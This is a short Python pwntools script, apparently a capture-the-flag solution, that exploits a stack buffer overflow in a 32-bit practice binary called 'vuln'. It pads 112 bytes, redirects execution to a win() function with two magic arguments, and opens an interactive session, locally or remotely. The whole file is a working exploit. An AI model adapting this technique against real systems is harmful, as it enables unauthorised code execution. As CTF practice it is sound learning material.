from pwn import *

# Set up the binary context
elf = ELF('./vuln', checksec=False)
context.binary = elf

# Choose local or remote (replace host and port with actual values for remote)
host, port = 'localhost', 9999
p = process(elf.path)  # Use: remote(host, port) for remote exploitation

# Calculate the offset:
# From our analysis the offset to EIP is 112 bytes.
offset = 112

# Build the payload:
# - Overwrite with 'A' * offset
# - Overwrite saved return address with address of win()
# - Next 4 bytes: a dummy return address (e.g. address of main)
# - Then the two required arguments for win()
payload  = b"A" * offset
payload += p32(elf.symbols.win)       # Redirect EIP to win()
payload += p32(elf.symbols.main)      # Dummy return address (could be any valid address)
payload += p32(0xCAFEF00D)             # Argument 1: must equal 0xCAFEF00D
payload += p32(0xF00DF00D)             # Argument 2: must equal 0xF00DF00D

# Start the exploit
p.recvuntil(b"[+] Fiya jou3, kayn maytkal ?")
p.sendline(payload)
p.interactive()
